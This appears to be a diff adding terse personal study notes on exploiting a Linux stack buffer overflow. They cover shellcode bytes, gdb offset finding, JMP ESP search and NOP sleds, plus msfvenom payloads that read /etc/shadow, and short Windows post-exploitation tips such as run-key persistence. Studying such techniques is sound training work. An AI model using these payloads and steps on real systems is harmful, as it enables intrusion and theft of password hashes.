+buf += b"\xbd\x8b\x89\xb6\xae\x4b\x2d\x47\xac\x2a\x59\x67"
+buf += b"\x1d\xc8\xd5\x04\x4e\x61\x7d\xaa\xf4\xea\x0a\x2c"
+buf += b"\xa2\xa7\x7d\xcd\x81\xc8"
+
+
+print(overflow + eip + nop)
+end of vim
+
+msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b '\x00' -f python
+
+./func <<< $(python lin_buff.py)
+sudo !!
+NEVER PUT SUDO IN THE MSFVENOM COMMAND
+save buffer overflow for last
+
+Buffer Overflow Demo:
+Run program
+Hangs waiting for input could either want user input or parameters
+Fill it with”a”to overflow program
+gdb <program>
+start with main function
+pdisass main
+ignore get_pc_thunk function
+red underline means vulnerable
+python script to overflow
+eip = “B” * 4
+<program> <<< $(python <script>) - inserts params as user input
+wiremask.eu
+run in gdb>run <<< $(python funcexploit.py)
+copy EIP hex into wiremask offsetget valid memory space for our code to execute
+env – gdb <file>
+gdb>show env
+gdb>unset env LINES
+gdb>unset env COLUMNS
+gdb>show env
+gdb>manually overflow it
+gbd>info proc map               (Done on their machine)
+find /b <hex on line under heap start address>,<hex on line above stack end address>,0xff,0xe4
+any of returned addresses can be used
+reverse byte order
+LOPs>msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+takes any linux commands-use simplest command possible to accomplish goal
+copy payload and add to script
+if didn’t work increase nop by 10
+never put sudo in msfvenom command, just sudo the program
+
+Linux Kernel: uname -a
+/etc/rsyslog.conf
+Windows Post-Ex:
+run keys for persistence
+C:\Users
+explorer: enable view hidden files to see all users
+Security Policies:
+auditpol /get /category:*       (Must be privileged user in privileged cmd)
+C Code:
+>>  << bit shift        (just google bit shift calculator)
